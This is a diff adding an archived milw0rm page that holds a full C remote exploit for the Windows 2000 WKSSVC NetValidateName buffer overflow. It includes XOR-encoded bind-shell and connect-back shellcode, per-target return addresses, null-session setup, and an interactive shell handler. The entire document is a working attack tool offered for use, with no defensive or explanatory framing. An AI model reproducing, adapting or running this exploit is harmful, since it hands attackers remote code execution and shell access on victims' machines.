@@ -1,0 +1,491 @@
+<html>
+<head>
+<title>milw0rm productions</title>
+<pre>
+/*
+ *  Author: snooq
+ *  Date: 14 November 2003  
+ *
+ *  +++++++++++++ THIS IS A PRIVATE VERSION +++++++++++++++
+ *
+ *  This is just slightly better than the one I posted to
+ *  packetstorm....
+ *
+ *  The public version will crash 'services.exe' immediately
+ *  while this one crash it only when u exit from shell....
+ *
+ *  I'm still trying to figure out a way to avoid the 'crash'
+ *  all together... any ideas????
+ *
+ *  Let me know if you hav trouble compiling this shit...
+ *  I hope this could be a good e.g for u to try Win32
+ *  exploitation..
+ *
+ *  This code is crappy... if u know of a better way of doing
+ *  things... pls tell me.......
+ *
+ *  Otherwise, if you guys r keen... I'll be more than happy
+ *  to go thru this in details wif u all... Meanwhile..enjoy!
+ *
+ *  +++++++++++++++++++++++++++++++++++++++++++++++++
+ */
+
+#pragma comment (linker,&quot;/NODEFAULTLIB:msvcprtd.lib&quot;) 
+#pragma comment (linker,&quot;/NODEFAULTLIB:libcmtd.lib&quot;) 
+#pragma comment (linker,&quot;/NODEFAULTLIB:libcmt.lib&quot;) 
+#pragma comment (linker,&quot;/NODEFAULTLIB:libcd.lib&quot;) 
+#pragma comment (lib,&quot;ws2_32&quot;)
+#pragma comment (lib,&quot;msvcrt&quot;)
+#pragma comment (lib,&quot;mpr&quot;)
+#pragma warning (disable:4013)
+
+#include &lt;winsock2.h&gt;
+#include &lt;windows.h&gt;
+#include &lt;process.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;lm.h&gt;
+
+#define NOP	0x90
+#define PORT	24876
+#define KEY	0x99999999
+
+#define ALIGN		1	// Between 0 ~ 3
+#define TARGET		1
+#define INTERVAL	3
+#define TIME_OUT	20
+#define PORT_OFFSET_1	198
+#define PORT_OFFSET_2	193 
+#define IP_OFFSET	186 
+#define SC_OFFSET	20	// Gap for some NOPs...
+#define RET_SIZE	2026	// Big enuff to take EIP... ;)
+
+#define SC_SIZE_1	sizeof(bindport)
+#define SC_SIZE_2	sizeof(connback)
+
+#define BSIZE	2600
+#define SSIZE	128
+
+extern char getopt(int,char **,char*);
+extern char *optarg;
+static int alarm_fired=0;
+
+HMODULE hMod;
+FARPROC fxn;
+HANDLE t1, t2;
+
+char buff[BSIZE];
+
+struct {
+	char *os;
+	long jmpesp;
+	char *dll;
+}
+
+targets[] = {
+	{
+		&quot;Window 2000 (en) SP4&quot;,
+		0x77e14c29,
+		&quot;user32.dll 5.0.2195.6688&quot; 
+	},
+	{
+		&quot;Window 2000 (en) SP1&quot;,
+		0x77e3cb4c,
+		&quot;user32.dll 5.0.2195.1600&quot; 
+	},
+	{
+		&quot;For debugging only&quot;,
+		0x41424344,
+		&quot;dummy.dll 5.0.2195.1600&quot; 
+	}
+}, v;
+
+/*
+ * HD Moore's shellcode..... ;)
+ */
+
+char bindport[]=
+	&quot;\xeb\x19\x5e\x31\xc9\x81\xe9\xa6\xff\xff\xff\x81\x36\x99\x99\x99&quot;
+	&quot;\x99\x81\xee\xfc\xff\xff\xff\xe2\xf2\xeb\x05\xe8\xe2\xff\xff\xff&quot;
+	&quot;\x71\xa1\x99\x99\x99\xda\xd4\xdd\x99\x7e\xe0\x5f\xe0\x7c\xd0\x1f&quot;
+	&quot;\xd0\x3d\x34\xb7\x70\x3d\x83\xe9\x5e\x40\x90\x6c\x34\x52\x74\x65&quot;
+	&quot;\xa2\x17\xd7\x97\x75\xe7\x41\x7b\xea\x34\x40\x9c\x57\xeb\x67\x2a&quot;
+	&quot;\x8f\xce\xca\xab\xc6\xaa\xab\xb7\xdd\xd5\xd5\x99\x98\xc2\xcd\x10&quot;
+	&quot;\x7c\x10\xc4\x99\xf3\xa9\xc0\xfd\x12\x98\x12\xd9\x95\x12\xe9\x85&quot;
+	&quot;\x34\x12\xc1\x91\x72\x95\x14\xce\xb5\xc8\xcb\x66\x49\x10\x5a\xc0&quot;
+	&quot;\x72\x89\xf3\x91\xc7\x98\x77\xf3\x93\xc0\x12\xe4\x99\x19\x60\x9f&quot;
+	&quot;\xed\x7d\xc8\xca\x66\xad\x16\x71\x09\x99\x99\x99\xc0\x10\x9d\x17&quot;
+	&quot;\x7b\x72\xa8\x66\xff\x18\x75\x09\x98\xcd\xf1\x98\x98\x99\x99\x66&quot;
+	&quot;\xcc\xb9\xce\xce\xce\xce\xde\xce\xde\xce\x66\xcc\x85\x10\x5a\xa8&quot;
+	&quot;\x66\xce\xce\xf1\x9b\x99\xf8\xb5\x10\x7f\xf3\x89\xcf\xca\x66\xcc&quot;
+	&quot;\x81\xce\xca\x66\xcc\x8d\xce\xcf\xca\x66\xcc\x89\x10\x5b\xff\x18&quot;
+	&quot;\x75\xcd\x99\x14\xa5\xbd\xa8\x59\xf3\x8c\xc0\x6a\x32\x10\x4e\x5f&quot;
+	&quot;\xdd\xbd\x89\xdd\x67\xdd\xbd\xa4\x10\xe5\xbd\xd1\x10\xe5\xbd\xd5&quot;
+	&quot;\x10\xe5\xbd\xc9\x14\xdd\xbd\x89\xcd\xc9\xc8\xc8\xc8\xd8\xc8\xd0&quot;
+	&quot;\xc8\xc8\x66\xec\x99\xc8\x66\xcc\xa9\x10\x78\xf1\x66\x66\x66\x66&quot;
+	&quot;\x66\xa8\x66\xcc\xb5\xce\x66\xcc\x95\x66\xcc\xb1\xca\xcc\xcf\xce&quot;
+	&quot;\x12\xf5\xbd\x81\x12\xdc\xa5\x12\xcd\x9c\xe1\x98\x73\x12\xd3\x81&quot;
+	&quot;\x12\xc3\xb9\x98\x72\x7a\xab\xd0\x12\xad\x12\x98\x77\xa8\x66\x65&quot;
+	&quot;\xa8\x59\x35\xa1\x79\xed\x9e\x58\x56\x94\x98\x5e\x72\x6b\xa2\xe5&quot;
+	&quot;\xbd\x8d\xec\x78\x12\xc3\xbd\x98\x72\xff\x12\x95\xd2\x12\xc3\x85&quot;
+	&quot;\x98\x72\x12\x9d\x12\x98\x71\x72\x9b\xa8\x59\x10\x73\xc6\xc7\xc4&quot;
+	&quot;\xc2\x5b\x91\x99&quot;;
+
+char connback[]=
+	&quot;\xeb\x19\x5e\x31\xc9\x81\xe9\xab\xff\xff\xff\x81\x36\x99\x99\x99&quot;
+	&quot;\x99\x81\xee\xfc\xff\xff\xff\xe2\xf2\xeb\x05\xe8\xe2\xff\xff\xff&quot;
+	&quot;\x71\xa9\x99\x99\x99\xda\xd4\xdd\x99\x7e\xe0\x5f\xe0\x75\x60\x33&quot;
+	&quot;\xf9\x40\x90\x6c\x34\x52\x74\x65\xa2\x17\xd7\x97\x75\xe7\x41\x7b&quot;
+	&quot;\xea\x34\x40\x9c\x57\xeb\x67\x2a\x8f\xce\xca\xab\xc6\xaa\xab\xb7&quot;
+	&quot;\xdd\xd5\xd5\x99\x98\xc2\xcd\x10\x7c\x10\xc4\x99\xf3\xa9\xc0\xfd&quot;
+	&quot;\x12\x98\x12\xd9\x95\x12\xe9\x85\x34\x12\xc1\x91\x72\x95\x14\xce&quot;
+	&quot;\xbd\xc8\xcb\x66\x49\x10\x5a\xc0\x72\x89\xf3\x91\xc7\x98\x77\xf3&quot;
+	&quot;\x91\xc0\x12\xe4\x99\x19\x60\x9d\xed\x7d\xc8\xca\x66\xad\x16\x71&quot;
+	&quot;\x1a\x99\x99\x99\xc0\x10\x9d\x17\x7b\x72\xa8\x66\xff\x18\x75\x09&quot;
+	&quot;\x98\xcd\xf1\x98\x98\x99\x99\x66\xcc\x81\xce\xce\xce\xce\xde\xce&quot;
+	&quot;\xde\xce\x66\xcc\x8d\x10\x5a\xa8\x66\xf1\x59\x31\x91\xa0\xf1\x9b&quot;
+	&quot;\x99\xf8\xb5\x10\x78\xf3\x89\xc8\xca\x66\xcc\x89\x1c\x59\xec\xdd&quot;
+	&quot;\x14\xa5\xbd\xa8\x59\xf3\x8c\xc0\x6a\x32\x5f\xdd\xbd\x89\xdd\x67&quot;
+	&quot;\xdd\xbd\xa4\x10\xc5\xbd\xd1\x10\xc5\xbd\xd5\x10\xc5\xbd\xc9\x14&quot;
+	&quot;\xdd\xbd\x89\xcd\xc9\xc8\xc8\xc8\xd8\xc8\xd0\xc8\xc8\x66\xec\x99&quot;
+	&quot;\xc8\x66\xcc\xb1\x10\x78\xf1\x66\x66\x66\x66\x66\xa8\x66\xcc\xbd&quot;
+	&quot;\xce\x66\xcc\x95\x66\xcc\xb9\xca\xcc\xcf\xce\x12\xf5\xbd\x81\x12&quot;
+	&quot;\xdc\xa5\x12\xcd\x9c\xe1\x98\x73\x12\xd3\x81\x12\xc3\xb9\x98\x72&quot;
+	&quot;\x7a\xab\xd0\x12\xad\x12\x98\x77\xa8\x66\x65\xa8\x59\x35\xa1\x79&quot;
+	&quot;\xed\x9e\x58\x56\x94\x98\x5e\x72\x6b\xa2\xe5\xbd\x8d\xec\x78\x12&quot;
+	&quot;\xc3\xbd\x98\x72\xff\x12\x95\xd2\x12\xc3\x85\x98\x72\x12\x9d\x12&quot;
+	&quot;\x98\x71\x72\x9b\xa8\x59\x10\x73\xc6\xc7\xc4\xc2\x5b\x91\x99\x09&quot;;
+
+void err_exit(char *s) {
+	printf(&quot;%s\n&quot;,s);
+	exit(0);
+}
+
+/*
+ * Ripped from TESO code and modifed by ey4s for win32
+ * and... lamer quoted it wholesale here..... =p
+ */
+
+void doshell(int sock) {
+	int l;
+	char buf[512];
+	struct timeval time;
+	unsigned long ul[2];
+
+	time.tv_sec=1;
+	time.tv_usec=0;
+
+	while (1) {
+		ul[0]=1;
+		ul[1]=sock;
+
+		l=select(0,(fd_set *)&amp;ul,NULL,NULL,&amp;time);
+		if(l==1) {
+			l=recv(sock,buf,sizeof(buf),0);
+			if (l&lt;=0) {
+				err_exit(&quot;-&gt; Connection closed...\n&quot;);
+			}
+			l=write(1,buf,l);
+			if (l&lt;=0) {
+				err_exit(&quot;-&gt; Connection closed...\n&quot;);
+			}
+		}
+		else {
+			l=read(0,buf,sizeof(buf));
+			if (l&lt;=0) {
+				err_exit(&quot;-&gt; Connection closed...\n&quot;);
+			}
+			l=send(sock,buf,l,0);
+			if (l&lt;=0) {
+				err_exit(&quot;-&gt; Connection closed...\n&quot;);
+			}
+		}
+	}
+}
+
+void changeip(char *ip) {
+	char *ptr;
+	ptr=connback+IP_OFFSET;
+	/* Assume Little-Endianess.... */
+	*((long *)ptr)=inet_addr(ip)^KEY;
+}
+
+void changeport(char *code, int port, int offset) {
+	char *ptr;
+	ptr=code+offset;
+	port^=KEY;
+	/* Assume Little-Endianess.... */
+	*ptr++=(char)((port&gt;&gt;8)&amp;0xff);
+	*ptr++=(char)(port&amp;0xff);
+}
+
+void banner() {
+	printf(&quot;\nWKSSVC Remote Exploit By Snooq [jinyean@hotmail.com]\n\n&quot;);
+}
+
+void usage(char *s) {
+	banner();
+	printf(&quot;Usage: %s [options]\n&quot;,s);
+	printf(&quot;\t-r\tSize of 'return addresses'\n&quot;);
+	printf(&quot;\t-a\tAlignment size [0~3]\n&quot;);
+	printf(&quot;\t-p\tPort to bind shell to (in 'connecting' mode), or\n&quot;);
+	printf(&quot;\t\tPort for shell to connect back (in 'listening' mode)\n&quot;);
+	printf(&quot;\t-s\tShellcode offset from the return address\n&quot;);
+	printf(&quot;\t-h\tTarget's IP\n&quot;);
+	printf(&quot;\t-t\tTarget types. ( -H for more info )\n&quot;);
+	printf(&quot;\t-H\tShow list of possible targets\n&quot;);
+	printf(&quot;\t-l\tListening for shell connecting\n&quot;);
+	printf(&quot;\t\tback to port specified by '-p' switch\n&quot;);
+	printf(&quot;\t-i\tIP for shell to connect back\n&quot;);
+	printf(&quot;\t-I\tTime interval between each trial ('connecting' mode only)\n&quot;);
+	printf(&quot;\t-T\tTime out (in number of seconds)\n\n&quot;);
+	printf(&quot;\tNotes:\n\t======\n\t'-h' is mandatory\n&quot;);
+	printf(&quot;\t'-i' is mandatory if '-l' is specified\n\n&quot;);
+	exit(0);
+}
+
+void showtargets() {
+	int i;
+	banner();
+	printf(&quot;Possible targets are:\n&quot;);
+	printf(&quot;=====================\n&quot;);
+	for (i=0;i&lt;sizeof(targets)/sizeof(v);i++) {
+		printf(&quot;%d) %s&quot;,i+1,targets[i].os);
+		printf(&quot; --&gt; 0x%08x (%s)\n&quot;,targets[i].jmpesp,targets[i].dll);
+	}
+	exit(0);
+}
+
+void sendstr(char *host) {
+
+	WCHAR wStr[128];
+	char ipc[128], hStr[128];
+
+	DWORD ret;
+	NETRESOURCE NET;
+
+	hMod=LoadLibrary(&quot;netapi32.dll&quot;);
+	fxn=GetProcAddress(hMod,&quot;NetValidateName&quot;);
+
+	_snprintf(ipc,127,&quot;\\\\%s\\ipc$&quot;,host);
+	_snprintf(hStr,127,&quot;\\\\%s&quot;,host);
+	MultiByteToWideChar(CP_ACP,0,hStr,strlen(hStr)+1,wStr,sizeof(wStr)/sizeof(wStr[0]));
+
+	NET.lpLocalName = NULL;
+	NET.lpProvider = NULL;
+	NET.dwType = RESOURCETYPE_ANY;
+	NET.lpRemoteName = (char*)&amp;ipc;
+
+	printf(&quot;-&gt; Setting up $IPC session...(aka 'null session')\n&quot;);
+	ret=WNetAddConnection2(&amp;NET,&quot;&quot;,&quot;&quot;,0);
+
+	if (ret!=ERROR_SUCCESS) { err_exit(&quot;-&gt; Couldn't establish IPC$ connection...&quot;); }
+	else printf(&quot;-&gt; IPC$ session setup successfully...\n&quot;);
+
+	printf(&quot;-&gt; Sending exploit string...\n&quot;);
+
+	ret=fxn((LPCWSTR)wStr,buff,NULL,NULL,0);
+
+}
+
+VOID CALLBACK alrm_bell(HWND hwnd, UINT uMsg, UINT idEvent, DWORD dwTime ) {
+	err_exit(&quot;-&gt; I give up...dude.....&quot;);
+}
+
+void setalarm(int timeout) {
+
+	MSG msg = { 0, 0, 0, 0 };
+	SetTimer(0, 0, (timeout*1000), (TIMERPROC)alrm_bell);
+
+	while(!alarm_fired) {
+		if (GetMessage(&amp;msg, 0, 0, 0) ) {
+			if (msg.message == WM_TIMER) printf(&quot;-&gt; WM_TIMER received...\n&quot;);
+			DispatchMessage(&amp;msg);
+		}
+	}
+
+}
+
+void resetalarm() {
+	if (TerminateThread(t2,0)==0) {
+		err_exit(&quot;-&gt; Failed to reset alarm...&quot;);
+	}
+	if (TerminateThread(t1,0)==0) {
+		err_exit(&quot;-&gt; Failed to kill the 'sending' thread...&quot;);
+	}
+}
+
+void do_send(char *host,int timeout) {
+	t1=(HANDLE)_beginthread(sendstr,0,host);
+	if (t1==0) { err_exit(&quot;-&gt; Failed to send exploit string...&quot;); }
+	t2=(HANDLE)_beginthread(setalarm,0,timeout);
+	if (t2==0) { err_exit(&quot;-&gt; Failed to set alarm clock...&quot;); }
+}
+
+int main(int argc, char *argv[]) {
+
+	char opt;
+	char *host, *ptr, *ip=&quot;&quot;;
+	struct sockaddr_in sockadd;
+	int i, i_len, ok=0, mode=0, flag=0;
+	int align=ALIGN, retsize=RET_SIZE, sc_offset=SC_OFFSET;
+	int target=TARGET, scsize=SC_SIZE_1, port=PORT;
+	int timeout=TIME_OUT, interval=INTERVAL;
+	long retaddr;
+
+	WSADATA wsd;
+	SOCKET s1, s2;
+
+	if (argc&lt;2) { usage(argv[0]); }
+
+	while ((opt=getopt(argc,argv,&quot;a:i:I:r:s:h:t:T:p:Hl&quot;))!=EOF) {
+		switch(opt) {
+			case 'a':
+			align=atoi(optarg);
+			break;
+
+			case 'I':
+			interval=atoi(optarg);
+			break;
+
+			case 'T':
+			timeout=atoi(optarg);
+			break;
+
+			case 't':
+			target=atoi(optarg);
+			retaddr=targets[target-1].jmpesp;
+			break;
+
+			case 'i':
+			ip=optarg;
+			changeip(ip);
+			break;
+
+			case 'l':
+			mode=1;
+			scsize=SC_SIZE_2;
+			break;
+
+			case 'r':
+			retsize=atoi(optarg);
+			break;
+
+			case 's':
+			sc_offset=atoi(optarg);
+			break;
+			
+			case 'h':
+			ok=1;
+			host=optarg;
+			sockadd.sin_addr.s_addr=inet_addr(optarg);
+			break;
+
+			case 'p':
+			port=atoi(optarg);
+			break;
+
+			case 'H':
+			showtargets();
+			break;
+
+			default:
+			usage(argv[0]);
+			break;
+		}
+	}
+
+	if (!ok || (mode&amp;&amp;((strcmp(ip,&quot;&quot;)==0)))) { usage(argv[0]); }
+
+	memset(buff,NOP,BSIZE);
+
+	ptr=buff+align;
+	for(i=0;i&lt;retsize;i+=4) {
+		*((long *)ptr)=retaddr;
+		ptr+=4;
+	}
+
+	if (WSAStartup(MAKEWORD(1,1),&amp;wsd)!=0) {
+		err_exit(&quot;-&gt; WSAStartup error....&quot;);
+	}
+
+	if ((s1=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))&lt;0) {
+		err_exit(&quot;-&gt; socket() error...&quot;);
+	}
+	sockadd.sin_family=AF_INET;
+	sockadd.sin_port=htons((SHORT)port);
+
+	ptr=buff+retsize+sc_offset;
+
+	if (BSIZE&lt;(retsize+sc_offset+scsize)) err_exit(&quot;-&gt; Bad 'sc_offset'..&quot;);
+
+	banner();
+
+	if (mode) {
+
+		printf(&quot;-&gt; 'Listening' mode...( port: %d )\n&quot;,port);
+
+		changeport(connback, port, PORT_OFFSET_2);
+		for(i=0;i&lt;scsize;i++) { *ptr++=connback[i]; }
+
+		do_send(host,timeout);
+		Sleep(1000);
+
+		sockadd.sin_addr.s_addr=htonl(INADDR_ANY);
+		i_len=sizeof(sockadd);
+
+		if (bind(s1,(struct sockaddr *)&amp;sockadd,i_len)&lt;0) {
+			err_exit(&quot;-&gt; bind() error&quot;);
+		}
+
+		if (listen(s1,0)&lt;0) {
+			err_exit(&quot;-&gt; listen() error&quot;);
+		}
+
+		printf(&quot;-&gt; Waiting for connection...\n&quot;);
+
+		s2=accept(s1,(struct sockaddr *)&amp;sockadd,&amp;i_len);
+
+		if (s2&lt;0) {
+			err_exit(&quot;-&gt; accept() error&quot;);
+		}
+
+		printf(&quot;-&gt; Connection from: %s\n\n&quot;,inet_ntoa(sockadd.sin_addr));
+
+		resetalarm();
+		doshell(s2);
+
+	}
+	else {
+
+		printf(&quot;-&gt; 'Connecting' mode...\n&quot;,port);
+
+		changeport(bindport, port, PORT_OFFSET_1);
+		for(i=0;i&lt;scsize;i++) { *ptr++=bindport[i]; }
+
+		do_send(host,timeout);
+		Sleep(1000);
+
+		printf(&quot;-&gt; Will try connecting to shell now....\n&quot;);
+
+		i=0;  
+		while(!flag) {
+			Sleep(interval*1000);
+			if(connect(s1,(struct sockaddr *)&amp;sockadd, sizeof(sockadd))&lt;0) {
+				printf(&quot;-&gt; Trial #%d....\n&quot;,i++);
+			}
+			else { flag=1; }
+		}
+
+		printf(&quot;-&gt; Connected to shell at %s:%d\n\n&quot;,inet_ntoa(sockadd.sin_addr),port);
+
+		resetalarm();
+		doshell(s1);
+
+	}
+
+	return 0;
+
+}</pre>
+//downloaded from milw0rm.com
+</html>
